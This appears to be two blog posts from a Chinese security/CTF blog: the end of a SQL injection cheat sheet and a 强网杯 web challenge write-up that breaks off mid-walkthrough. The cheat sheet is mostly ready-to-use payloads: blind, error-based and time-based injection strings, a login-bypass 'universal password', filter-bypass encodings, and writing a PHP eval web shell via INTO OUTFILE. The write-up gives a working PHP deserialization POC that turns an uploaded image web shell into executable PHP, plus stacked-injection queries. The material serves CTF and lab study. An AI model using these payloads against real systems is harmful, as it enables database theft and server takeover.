<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//left判断前两位 </span><br><span class="line">?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos; %23 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&apos;em&apos; %23 </span><br><span class="line">//substr判断第三位 </span><br><span class="line">?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)=&apos;a&apos; %23 </span><br><span class="line">//regexp判断第四位 </span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regexp &apos;^emai[a-z]&apos; limit 0,1) %23 </span><br><span class="line">//mid判断第五位 </span><br><span class="line">?id=1&apos; and mid((seanlect table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)=&apos;l&apos; %23</span><br></pre></td></tr></table></figure>

<p>如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可</p>
<p>但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png" alt="img"></p>
<h2 id="数据列-1"><a href="#数据列-1" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure>

<p>改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;xxxx&apos; limit 0,1</span><br></pre></td></tr></table></figure>

<p>再进行判断</p>
<h2 id="数据内容-1"><a href="#数据内容-1" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//ifnull和cast函数，第一位为D </span><br><span class="line">?id=1&apos; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 %23 </span><br><span class="line">//普通方式，第二位为u </span><br><span class="line">?id=1&apos; and ascii(substr((select username from security.users order by id limit 0,1),2,1))=85 %23</span><br></pre></td></tr></table></figure>

<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>使用报错注入的前提是，当前页面能够 print_r(mysql_error()) 或者是 echo(mysql_error())</p>
<p>后面 from 的表必须是存在的，比如 information_schema.tables 或者 information_schema.columns </p>
<h2 id="Floor报错"><a href="#Floor报错" class="headerlink" title="Floor报错"></a>Floor报错</h2><p>这两种语句都可以，只是第一个知道字段数是3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//替换 select user() </span><br><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23 </span><br><span class="line">//替换 select schema_name frominformation_schema.schemata limit 0,1 </span><br><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(((select schema_name frominformation_schema.schemata limit 0,1)),&apos;;&apos;,floor (rand(0)*2))x frominformation_schema.tables group by x)a) %23</span><br></pre></td></tr></table></figure>

<p>简化版Floor报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>

<p>如果关键的表被禁用了，可以使用这种形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg" alt="img"></p>
<p>如果 rand 被禁用了可以使用用户变量来报错(实测未成功)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)</span><br></pre></td></tr></table></figure>

<h2 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h2><p>放一个蓝鲸的题：<a href="http://202.98.3.108:10010/websql/index.php" target="_blank" rel="noopener">http://202.98.3.108:10010/websql/index.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//extractvalue </span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) %23 </span><br><span class="line">//updatexml </span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) %23</span><br></pre></td></tr></table></figure>

<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(10))  %23</span><br></pre></td></tr></table></figure>

<h2 id="benchmark-实测未成功"><a href="#benchmark-实测未成功" class="headerlink" title="benchmark()(实测未成功)"></a>benchmark()(实测未成功)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (if(ascii(substr(current,1,1))=113,benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select database() as current) as tb1 %23</span><br></pre></td></tr></table></figure>

<h1 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h1><p>首先判断当前用户是否具有写入权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23  //返回正确，说明有最高权限</span><br></pre></td></tr></table></figure>

<p>将 select 内容导入文件，这里的 path 必须要是绝对路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;path&quot; </span><br><span class="line">//version()也可以换成一句话 </span><br><span class="line">select &lt;?php @eval($_post[&quot;a&quot;])?&gt; into outfile &quot;path&quot;</span><br></pre></td></tr></table></figure>

<p>这里是可以直接 getshell 的</p>
<h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><p>和 GET 注入类似，只是传输的数据不在 URL 中显示，有时需要抓包。常见于登陆的页面</p>
<p>最常见的一个，万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1</span><br></pre></td></tr></table></figure>

<p>提交 username=admin’ #   password=1(任意密码) 即可登陆</p>
<p>有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里注入(报错注入，布尔盲注，时间盲注，联合查询)</p>
<h1 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h1><p>常见于注册(insert)和修改内容(update)的页面，有时需要抓包</p>
<p>比如修改密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;</span><br></pre></td></tr></table></figure>

<p>在 password 或者 username 处注入，最常见的用报错注入。有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里报错注入</p>
<p>这里也会造成二次注入</p>
<h1 id="HEADER头注入"><a href="#HEADER头注入" class="headerlink" title="HEADER头注入"></a>HEADER头注入</h1><p>抓包修改 header 头部，比如 user-agent，referer，cookie</p>
<p><strong>sqli-labs Less-18</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//Less-19的 referer 同理，也可以用 floor，updatexml </span><br><span class="line">1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png" alt="img"></p>
<p>我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png" alt="img"></p>
<p><strong>Less-20修改cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png" alt="img"></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数</p>
<p>两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效</p>
<p>绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//GET型 </span><br><span class="line">?id=-1%df%27 union select 1 %23 </span><br><span class="line">//POST型，以万能密码为例，&apos; 转为 utf-16 或者 utf-32 </span><br><span class="line">//此处 �&apos; 的 urlencode 为 %ef%bf%bd%27  </span><br><span class="line">name=�&apos; or 1=1 # &amp;pass=111</span><br></pre></td></tr></table></figure>

<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，用分号( ; )来表示语句的结尾，如果再 ; 结束一个 SQL 语句之后继续构造下一条语句，是会在一起执行的。对比于 union 的查询语句，堆叠注入可以执行任意语句</p>
<p><a href="https://peri0d.xyz/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/#%e9%9a%8f%e4%be%bf%e6%b3%a8" target="_blank" rel="noopener">强网杯-随便注</a></p>
<h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><h2 id="过滤-和-–"><a href="#过滤-和-–" class="headerlink" title="过滤 # 和 –+"></a>过滤 # 和 –+</h2><p>1、union 联合查询，控制查询结果显示位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,user(),&apos;3</span><br></pre></td></tr></table></figure>

<p>2、利用 or ‘1’=’1 闭合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or extractvalue(1,concat(0x7e,(select user()),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p>3、编码绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line"># = %23 </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line"># = %23  </span><br><span class="line">--+ = %2D%2D%2B </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line"># = \u0023  </span><br><span class="line">--+ = \u002d\u002d\u002b </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">--+ = &amp;#45;&amp;#45;&amp;#43;  </span><br><span class="line"># = &amp;#35</span><br></pre></td></tr></table></figure>

<h2 id="过滤-and-和-or"><a href="#过滤-and-和-or" class="headerlink" title="过滤 and 和 or"></a>过滤 and 和 or</h2><p>1、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">Or	OR	oR	AND </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">and = %61%6E%64  </span><br><span class="line">or = %6F%72 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">and = \u0061\u006e\u0064  </span><br><span class="line">or = \u006f\u0072 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">and = &amp;#97;&amp;#110;&amp;#100;       </span><br><span class="line">or = &amp;#111;&amp;#114;</span><br></pre></td></tr></table></figure>

<p>2、替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp; </span><br><span class="line">or = ||  </span><br><span class="line">//在 URL 栏中 &amp;&amp; 要换 %26%26</span><br></pre></td></tr></table></figure>

<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1、特殊字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%a0	新建一行 </span><br><span class="line">%0b TAB垂直 </span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure>

<p>2、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//unicode </span><br><span class="line">\u0020 </span><br><span class="line"></span><br><span class="line">//html encode</span><br><span class="line">&amp;#32;</span><br></pre></td></tr></table></figure>

<h2 id="过滤-union-和-select-等"><a href="#过滤-union-和-select-等" class="headerlink" title="过滤 union 和 select 等"></a>过滤 union 和 select 等</h2><p>1、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">UniON  SelEcT </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">union = %75%6E%69%6F%6E  </span><br><span class="line">select = %73%65%6C%65%63%74 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">union = \u0075\u006e\u0069\u006f\u006e  </span><br><span class="line">select = \u0073\u0065\u006c\u0065\u0063\u0074 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">union = &amp;#32;&amp;#117;&amp;#110;&amp;#105;&amp;#111;&amp;#110;</span><br><span class="line">select = &amp;#115;&amp;#101;&amp;#108;&amp;#101;&amp;#99;&amp;#116;</span><br></pre></td></tr></table></figure>

<p>2、重复(只过滤一次时)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ununionion</span><br><span class="line">selselectect</span><br></pre></td></tr></table></figure>

<p>3、注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/ </span><br><span class="line">/*!select*/</span><br></pre></td></tr></table></figure>

<h2 id="过滤-‘-和"><a href="#过滤-‘-和" class="headerlink" title="过滤 ‘ 和 \"></a>过滤 ‘ 和 \</h2><p>1、宽字节注入</p>
<p>2、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">&apos; = \u0027 </span><br><span class="line">\ = \u005c </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">&apos; = &amp;#39;</span><br><span class="line">\ = &amp;#92;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/05/2019强网杯web复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/05/2019强网杯web复现/" itemprop="url">强网杯web复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-05T12:17:46+08:00">
                2019-06-05
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-wp/" itemprop="url" rel="index">
                    <span itemprop="name">CTF wp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p>
<h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>大佬的 wp : <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><ol>
<li><p>只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下</p>
</li>
<li><p>本题是 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 泄露，源码泄露总结<a href>点击此处</a></p>
</li>
<li><p>函数流程：</p>
<ol>
<li>没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化</li>
<li>在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册</li>
<li>在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆</li>
<li>已经登陆时，跳转到 index.php/home 进行文件上传操作</li>
<li>在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹</li>
<li>然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename</li>
<li>然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0</li>
<li>如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数</li>
<li>update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update_cookie 函数</li>
<li>update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user</li>
<li>profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。__get 会直接从 except 里找，__call 会调用自身的 name 成员变量所指代的变量所指代的方法。</li>
</ol>
</li>
<li><p>攻击流程：</p>
<ol>
<li><p>注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_1.png" alt></p>
<p>解码后如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_2.png" alt></p>
</li>
<li><p>选择上传图片，这个图片就是合成的图片马，从 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里巴巴矢量图库</a> 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error</p>
</li>
<li><p>上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_3.png" alt></p>
<p>解码后如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_4.png" alt></p>
</li>
<li><p>使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。</p>
</li>
<li><p>最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag</p>
</li>
</ol>
</li>
<li><p>最终 poc 如下，修改上传图片地址即可</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line"><span class="comment">//修改地址即可</span></span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效</p>
<p>copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy(“./1.png”, “./1.php” ) 执行之后会存在两个文件 1.png 和 1.php</p>
<p>unlink(a)，a 是文件路径，删除文件 a</p>
</blockquote>
<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol>
<li><p>打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了</p>
</li>
<li><p>输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . </p>
<p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
</li>
<li><p>测试一下有没有注入。<code>?inject=1&#39;%23</code>，返回正常，字符型注入</p>
</li>
<li><p>过滤了这么多关键词，尝试堆叠注入。<code>?inject=1&#39;;show databases;%23</code>，看到了所有的数据库</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt></p>
</li>
<li><p>再看一下所有的表。<code>?inject=1&#39;;show tables;%23</code>，1919810931114514 表和 words 表</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt></p>
</li>
<li><p>flag 在全数字的表里，默认查询的是 words 表</p>
